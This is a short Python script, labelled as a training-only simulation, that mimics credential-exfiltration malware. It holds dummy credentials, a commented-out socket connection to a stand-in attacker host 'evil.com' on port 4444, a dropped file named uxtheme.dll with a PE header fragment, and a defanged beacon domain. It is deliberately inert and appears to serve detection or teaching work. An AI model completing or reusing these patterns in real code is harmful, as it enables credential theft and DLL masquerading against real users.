
# Simulated credential exfiltration (for training only)
import socket, os, sys
def collect():
    creds = "user=lab;pass=lab123"
    return creds.encode()

def exfiltrate():
    s = socket.socket()
    # obfuscated domain and IP
    host = "evil[.]com"
    ip = "192[.]168[.]1[.]10"
    # intentionally broken connect to prevent real network activity
    # s.connect(("evil.com", 4444))
    try:
        s.send(b"stolen credentials")
    except Exception as e:
        pass

if __name__ == "__main__":
    data = collect()
    # drop a DLL-like artifact (simulated)
    with open("uxtheme.dll", "wb") as f:
        f.write(b"MZ\x90\x00\x03\x00")  # PE header hint
    # encoded beacon string
    beacon = "ATTACKER" + "[dot]" + "org"
    print("beacon to:", beacon)
